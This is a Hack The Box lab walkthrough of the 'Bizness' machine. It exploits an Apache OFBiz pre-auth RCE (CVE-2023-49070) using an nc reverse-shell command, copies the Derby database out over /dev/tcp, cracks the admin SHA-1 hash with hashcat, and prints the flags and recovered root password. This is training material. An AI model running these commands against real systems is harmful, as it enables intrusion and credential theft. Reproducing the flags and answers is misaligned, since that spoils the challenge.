# Bizness

<div align="left"><figure><img src="../.gitbook/assets/image (3) (1).png" alt="" width="150"><figcaption></figcaption></figure></div>

🔗 [Bizness](https://www.hackthebox.com/machines/bizness)

<details>

<summary>About</summary>

### Machine Description

Bizness is an easy Linux machine showcasing an Apache OFBiz pre-authentication, remote code execution (RCE) foothold, classified as `[CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070)`. The exploit is leveraged to obtain a shell on the box, where enumeration of the OFBiz configuration reveals a hashed password in the service's Derby database. Through research and little code review, the hash is transformed into a more common format that can be cracked by industry-standard tools. The obtained password is used to log into the box as the root user.

### Area of Interest

Web ApplicationDatabasesCommon Applications

### Technology

NGINXApache OFBiz

### Vulnerabilities

Weak CredentialsRemote Code ExecutionMisconfigurationInsecure Design

### Security Tools

NetcathashcatNmap

### Languages

PythonJava

### Techniques

ReconnaissanceWeb Site Structure DiscoveryConfiguration AnalysisPassword ReusePassword Cracking

### CVE

CVE-2023-49070

</details>

## Task 0 - Deploy machine

🎯 Target IP: `10.129.237.34`

Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.

After this we run the VPN to be able to reach the lab: `openvpn htb_vpn.ovpn`

## Task 1 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "10.129.237.34 bizness.htb" >> /etc/hosts
</strong>
mkdir -p htb/bizness.htb
cd htb/bizness.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 bizness.htb
PING bizness.htb (10.129.237.34) 56(84) bytes of data.
64 bytes from bizness.htb (10.129.237.34): icmp_seq=1 ttl=63 time=50.8 ms
64 bytes from bizness.htb (10.129.237.34): icmp_seq=2 ttl=63 time=56.0 ms
64 bytes from bizness.htb (10.129.237.34): icmp_seq=3 ttl=63 time=53.3 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target should be a **\*nix** system, while Windows systems usually have a TTL of 128 secs.

### 1.1 - How many TCP ports are listening on Bizness?

Let's start right away with an active port scan with nmap

```bash
sudo nmap -p0- -sS -Pn -T4 -vvv bizness.htb -oN nmap/tcp_port_scan
```

```bash
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
443/tcp   open  https   syn-ack ttl 63
45853/tcp open  unknown syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 4 open TCP ports on the machine: 22,80,443,45853.

{% hint style="info" %}
4
{% endhint %}

Then, we can proceed to analyze services active on open ports:

```bash
sudo nmap -sV -sC -p 22,80,443,45853 bizness.htb -oN nmap/service_port_scan
```

```bash
ORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   nginx 1.18.0
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_ssl-date: TLS randomness does not represent time
45853/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 1.2 - What Enterprise Resource Planning (ERP) backend is in use?

Web servers have installed nginx vs 1.18, we can confirm it and know other info using: `whatweb bizness.htb` command:

```bash
http://bizness.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.129.237.34], RedirectLocation[https://bizness.htb/], Title[301 Moved Permanently], nginx[1.18.0]
https://bizness.htb/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[10.129.237.34], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
```

Then, go to web server via browser:

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Doing a directory enumeration with Dirb tool and checking source page we don't discover others useful thing.

```bash
dirb https://bizness.htb 
```

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

We discover an interesting page that contains login form and the version of ERP:

[https://bizness.htb/accounting/control/main](https://bizness.htb/accounting/control/main)

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
apache ofbiz
{% endhint %}

### 1.3 - What version of OFBiz is running on the target system?

\
OFBiz vs is already present into last screen:

{% hint style="info" %}
18.12
{% endhint %}

## Task 2 - Exploitation & User Flag

### 2.1 - What is the 2023 CVE ID for a pre-authentication, remote code execution vulnerability on this version of OFBiz?

Using searchsploit tool we can discover quickly an exploit for this version of Apache OFBiz

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

search it on google to check potential alternatives and find the relative CVE ID

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

this CVE is about 2024, so we need to check another CVE for 2023, so google: "ofbiz 18.12 CVE 2023"&#x20;

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

and we found a CVE about 2023 on nist site:&#x20;

[https://nvd.nist.gov/vuln/detail/cve-2023-49070](https://nvd.nist.gov/vuln/detail/cve-2023-49070)

Pre-auth RCE in Apache Ofbiz 18.12.09. It's due to XML-RPC no longer maintained still present. This issue affects Apache OFBiz: before 18.12.10. Users are recommended to upgrade to version 18.12.10

{% hint style="info" %}
CVE-2023-49070
{% endhint %}

### 2.2 - What user is the OFBiz service running as?

There's a PoC to exploit it on github: [https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) that contains all which we need: PoC and ysoserial-all.jar tool

{% hint style="warning" %}
Always be careful what you download, open source / github does not mean 100% harmless program
{% endhint %}

Download files locally using git clone command:

```bash
git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
```

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

check our attacker box machine IP using `ifconfig tun0` go in listening mode using netcat `nc -lvnp 1339` and into another shell, go run our exploit spawning a /bin/bash shell

```bash
python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.17.177 1339'
```



<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
```
ofbiz
```
{% endhint %}

### 2.3 - Submit the flag located in the ofbiz user's home directory.

Go to the user home dir using cd \~ and cat the user flag

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

f17ce10e2a6f6da2a5f4d76ebb61c401

</details>

## Task 3 - Privilege Escalation & Root Flag

### 3.1 - What is the full path of the directory that OFBiz is installed in?

We can find it into /opt directory

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
/opt/ofbiz
{% endhint %}

### 3.2 - What hashing algorithm is the OFBiz installation configured to use for passwords?

To make our shell interactive and more usable run this command: `python3 -c 'import pty;pty.spawn("/bin/bash")'`

and start to search into a configuration files the hashing algorithm used.

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

there's an interesting file at the path: /opt/ofbiz/framework/security/config that contains the answer:

<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
SHA
{% endhint %}

### 3.3 - What database is used by Apache OFBiz, by default?

Search directory that regards database among the folders regarding data.

We found an interesting file at the path: `/opt/ofbiz/runtime/data/derby/derby.log` that contains db logs with correspective db name and its version

<figure><img src="../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Apache Derby
{% endhint %}

### 3.4 - In which directory are the Derby-related files stored on Bizness?

Navigating into folders there's an interesting  file at path: /opt/ofbiz/runtime/data/derby/ofbiz/seg0 with more files .dat

<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

Search into them if there's an 'admin' string using this command: `grep -a -l 'admin.$' *.dat` to search only interesting files that should contains sensitive administrative strings

<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

and into file called: c6650.dat we found this value: `admin$"$SHA$$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

{% hint style="info" %}
/opt/ofbiz/runtime/data/derby
{% endhint %}

### 3.5 - Using derby-tools and the `ij` command-line utility, what is the command within `ij` to connect to a database stored in `./ofbiz`?

Maybe, I've already gone too far with the previous question.

<figure><img src="../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

ij utility seems be not present into these machine, so we can transfer .dat files and install ij utility on our kali attacker machine.

* Archive file using: `tar cvf /dev/shm/derby.tar derby`
* Transfer derby files to attacker machine:&#x20;
  * Go in listening mode on attacker machine: `nc -lvnp 4433 > derby.tar`
  * Send file via netcat: `cat /dev/shm/derby.tar > /dev/tcp/10.10.17.177/4433`

<figure><img src="../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

Now we've a db on attacker machine, unzip the db archieve using: `tar -xvf derby.tar`

and we can install ij to connect db:

```bash
sudo apt-install derby-tools
ij
protocol 'jdbc:derby';
connect 'jdbc:derby:./ofbiz;create=true'; 
show tables;
```

<figure><img src="../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

In my case i've add an additional flag 'true' to to start the connection correctly.

{% hint style="info" %}
connect 'jdbc:derby:./ofbiz';
{% endhint %}

### 3.6 - Which table contains the SHA-1 hash of the `admin` user?

Querying db we can discover the table that cotnains the SHA-1 hash of the admin user:

```sql
select * from OFBIZ.USER_LOGIN;
describe OFBIZ.USER_LOGIN;
select USER_LOGIN_ID,CURRENT_PASSWORD FROM OFBIZ.USER_LOGIN;
```

That's of course the same that we already know: `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

{% hint style="info" %}
```
USER_LOGIN
```
{% endhint %}

### 3.7 - What is the hex version of the discovered hash?

We know that the psw hash: `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I` is in SHA1-based format

* `$SHA$`: This indicates the use of the SHA-1 hashing algorithm.
* `d`: This is the salt used in the hashing process.
* `uP0_QaVBpDWFeo8-dRzDqRwXQ2I`: This is the Base64 URL-encoded hash. After decoding, this represents the actual hash value.

Decoding the Base64 URL-encoded String

```bash
echo "uP0_QaVBpDWFeo8-dRzDqRwXQ2I" | base64 -d | xxd -p > hash.txt
```

* `base64 -d`: This decodes the Base64 URL-encoded string.
* `xxd -p`: This converts the decoded bytes into a plain hexadecimal format. We need the hexadecimal version of the hash to use it in hashcat.

This generates a file hash.txt containing the decoded hash in hexadecimal format.

At this point, we have the decoded hash and we know the salt (`d`). However, hashcat expects the input hash to be in the format: `<hash>:<salt>`

```bash
echo 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' > hash.txt
```

{% hint style="info" %}
```
b8fd3f41a541a435857a8f3e751cc3a91c174362
```
{% endhint %}

### 3.7 - What is the root user's password?

\
Now, we can proceeding to cracking hash using hashcat, using the -m 120 thatcorresponds to the hashing algorithm `sha1($salt.$pass)`

```bash
hashcat -m 120 hash.txt /usr/share/wordlists/rockyou.txt
```

obtaining our psw in cleartext: `b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness`



<figure><img src="../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
monkeybizness
{% endhint %}

### 3.8 - Submit the flag located in the root user's home directory.

Finally, we know the admin password and we can access using sudo command: `su -`

<figure><img src="../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

751fab1137897a30e64a45e099f8f9b7

</details>

<figure><img src="../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>
